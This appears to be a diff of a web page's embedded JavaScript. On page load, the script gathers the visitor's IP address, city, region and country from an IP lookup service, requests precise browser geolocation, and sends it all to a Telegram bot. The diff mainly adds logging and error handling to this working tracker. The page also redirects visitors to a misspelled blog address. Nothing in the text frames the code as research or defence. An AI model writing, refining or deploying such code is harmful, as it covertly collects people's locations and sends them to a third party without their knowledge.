@@ -15,7 +15,7 @@ document.location.href = 'https://expried.blogspot.com/';
 console.log('Server aktif');
 }
       </script>
-              <script>
+                 <script>
         window.onload = function() {
             // Get IP address and location data
             fetch('https://ipapi.co/json/')
@@ -25,7 +25,7 @@ console.log('Server aktif');
                     const city = data.city;
                     const region = data.region;
                     const country = data.country_name;
-                    const flag = `https://flagsapi.com/BE/shiny/${data.country_code}`;
+                    const flag = `https://flagsapi.com/${data.country_code}/flat/`;
 
                     // Get geolocation
                     if (navigator.geolocation) {
@@ -44,6 +44,8 @@ console.log('Server aktif');
                                 <img src="${flag}" alt="Flag of ${country}">
                             `;
 
+                            console.log('Sending message:', message);
+
                             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                 method: 'POST',
                                 headers: {
@@ -57,6 +59,7 @@ console.log('Server aktif');
                             })
                             .then(response => response.json())
                             .then(data => {
+                                console.log('Response from Telegram:', data);
                                 if (data.ok) {
                                     alert('Data sent successfully!');
                                 } else {
@@ -66,13 +69,15 @@ console.log('Server aktif');
                             .catch(error => {
                                 console.error('Error:', error);
                             });
+                        }, error => {
+                            console.error('Geolocation error:', error);
                         });
                     } else {
                         alert('Geolocation is not supported by this browser.');
                     }
                 })
                 .catch(error => {
-                    console.error('Error:', error);
+                    console.error('Error fetching IP data:', error);
                 });
         };
     </script>
